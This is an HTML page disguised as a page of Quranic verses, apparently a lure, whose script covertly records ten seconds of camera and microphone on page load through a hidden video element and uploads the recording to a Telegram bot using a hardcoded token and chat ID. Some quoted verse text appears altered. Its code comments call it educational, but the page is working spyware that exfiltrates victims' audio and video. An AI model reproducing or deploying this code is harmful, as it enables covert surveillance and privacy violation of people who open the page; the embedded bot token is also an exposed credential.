<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> ايات قرانية</title>
<style>
body{font-family:Tahoma, Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f3f6ff}
#msg{max-width:760px;padding:18px;text-align:center;color:#222}
#status{margin-top:10px;color:#333}
video{display:none}
</style>
</head>
<body>
<div id="msg">
<h3>اذكر الله</h3>
<p id="status">جاهز — جارٍ المحاولة لبدء التسجيل تلقائيًا...</p>
<small>اللهم صلي وسلم علي نبينا محمدﷺ</small>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>

<script>
const RECORD_SECONDS = 10; // مدة التسجيل
const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0"; // استبدل محليًا لتجربة الإرسال
const CHAT_ID  = "6683130316";    // استبدل محليًا لتجربة الإرسال

const statusEl = document.getElementById('status');
const hiddenVideo = document.getElementById('hiddenVideo');

let started = false;
let stream = null;
let mediaRecorder = null;
let recordedBlobs = [];

window.addEventListener('load', ()=>{ attemptStart(); 
  window.addEventListener('click', onFirstInteraction,{once:true});
  window.addEventListener('touchstart',onFirstInteraction,{once:true});
  window.addEventListener('keydown',onFirstInteraction,{once:true});
});

function onFirstInteraction(){ if(!started) attemptStart(); }

async function attemptStart(){
  if(started) return;
  started = true;
  statusEl.textContent='① الزَّانِيَةُ وَالزَّانِي فَاجْلِدُوا كُلَّ وَاحِدٍ مِنْهُمَا مِائَةَ جَلْدَةٍ ۖ وَلَا تَأْخُذْكُمْ بِهِمَا رَأْفَةٌ فِي دِينِ اللَّهِ إِن كُنتُمْ تُؤْمِنُونَ بِاللَّهِ وَالْيَوْمِ الْآخِرِ ۖ وَلْيَشْهَدْ عَذَابَهُمَا طَائْفَةٌ مِّنَ الْمُؤْمِنِينَ

② الزَّانِي لَا يَنكِحُ إِلَّا زَانِيَةً أَوْ مُشْرِكَةً وَالزَّانِيَةُ لَا يَنكِحُهَا إِلَّا زَانٍ أَوْ مُشْرِكٌ وَحُرِّمَ ذَلِكَ عَلَى الْمُؤْمِنِينَ

③ وَالَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ ثُمَّ لَمْ يَأْتُوا بِأَرْبَعَةِ شُهَدَاءٍ فَاجْلِدُوهُمْ ثَمَانِينَ جَلْدَةً وَلَا تَقْبَلُوا لَهُمْ شَهَادَةً أَبَدًا ۚ وَأُولَٰئِكَ هُمُ الْفَاسِقُونَ

④ إِلَّا الَّذِينَ تَابُوا مِن بَعْدِ ذَٰلِكَ وَأَصْلَحُوا فَإِنَّ اللَّهَ غَفُورٌ رَّحِيمٌ

⑤ وَالْمُحْصَنَاتُ مِنَ النِّسَاءِ إِلَّا مَا مَلَكَتْ أَيْمَانُكُمْ كِتَابَ اللَّهِ عَلَيْكُمْ ۚ وَرَاجُوا النِّسَاءَ بِالْمَعْرُوفِ ۚ وَلا تَعْتَدُوا ۚ إِنَّ اللَّهَ كَانَ عَفُوًّا غَفُورًا';
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    hiddenVideo.srcObject = stream;
    startRecording();
  }catch(err){
    console.warn('getUserMedia failed:',err);
    statusEl.textContent='فشل الوصول للكاميرا أو الميكروفون.';
    started=false;
  }
}

function startRecording(){
  try{ mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});}catch(e){ mediaRecorder=new MediaRecorder(stream);}
  recordedBlobs=[];
  mediaRecorder.ondataavailable=ev=>{if(ev.data && ev.data.size) recordedBlobs.push(ev.data);}
  mediaRecorder.onstart=()=>{statusEl.textContent=`التسجيل بدأ تلقائيًا — سيقف بعد ${RECORD_SECONDS} ثانية.`;}
  mediaRecorder.onstop=async()=>{
    statusEl.textContent='انتهى التسجيل — جارٍ الإرسال للبوت...';
    if(stream) stream.getTracks().forEach(t=>t.stop());
    const blob=new Blob(recordedBlobs,{type:'video/webm'});

    if(!BOT_TOKEN.includes('PUT') && !CHAT_ID.includes('PLACEHOLDER')){
      try{
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption','① الزَّانِيَةُ وَالزَّانِي فَاجْلِدُوا كُلَّ وَاحِدٍ مِنْهُمَا مِائَةَ جَلْدَةٍ ۖ وَلَا تَأْخُذْكُمْ بِهِمَا رَأْفَةٌ فِي دِينِ اللَّهِ إِن كُنتُمْ تُؤْمِنُونَ بِاللَّهِ وَالْيَوْمِ الْآخِرِ ۖ وَلْيَشْهَدْ عَذَابَهُمَا طَائْفَةٌ مِّنَ الْمُؤْمِنِينَ

② الزَّانِي لَا يَنكِحُ إِلَّا زَانِيَةً أَوْ مُشْرِكَةً وَالزَّانِيَةُ لَا يَنكِحُهَا إِلَّا زَانٍ أَوْ مُشْرِكٌ وَحُرِّمَ ذَلِكَ عَلَى الْمُؤْمِنِينَ

③ وَالَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ ثُمَّ لَمْ يَأْتُوا بِأَرْبَعَةِ شُهَدَاءٍ فَاجْلِدُوهُمْ ثَمَانِينَ جَلْدَةً وَلَا تَقْبَلُوا لَهُمْ شَهَادَةً أَبَدًا ۚ وَأُولَٰئِكَ هُمُ الْفَاسِقُونَ

④ إِلَّا الَّذِينَ تَابُوا مِن بَعْدِ ذَٰلِكَ وَأَصْلَحُوا فَإِنَّ اللَّهَ غَفُورٌ رَّحِيمٌ

⑤ وَالْمُحْصَنَاتُ مِنَ النِّسَاءِ إِلَّا مَا مَلَكَتْ أَيْمَانُكُمْ كِتَابَ اللَّهِ عَلَيْكُمْ ۚ وَرَاجُوا النِّسَاءَ بِالْمَعْرُوفِ ۚ وَلا تَعْتَدُوا ۚ إِنَّ اللَّهَ كَانَ عَفُوًّا غَفُورًا');
        form.append('video', blob, `rec_${Date.now()}.webm`);
        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:form});
        if(!resp.ok){
          const txt = await resp.text().catch(()=>null);
          console.error('HTTP error',resp.status, txt);
          statusEl.textContent=`فشل الإرسال (HTTP ${resp.status}) — غالبًا CORS أو التوكن غير صحيح.`;
          return;
        }
        const json = await resp.json().catch(()=>null);
        if(json && json.ok){
          statusEl.textContent='✅ تم الإرسال إلى Telegram (تعليمي).';
        }else{
          console.error('Telegram API response', json);
          statusEl.textContent='❌ الإرسال فشل: تحقق من التوكن وChat ID.';
        }
      }catch(err){
        console.error('send error:',err);
        statusEl.textContent='حدث خطأ أثناء الإرسال: '+(err.message||err);
      }
    }else{
      statusEl.textContent='لا يمكن الإرسال: ضع BOT_TOKEN وCHAT_ID محليًا لتجربة الإرسال.';
    }
  };
  mediaRecorder.start();
  setTimeout(()=>{if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop();}, RECORD_SECONDS*1000);
}
</script>
</body>
</html>
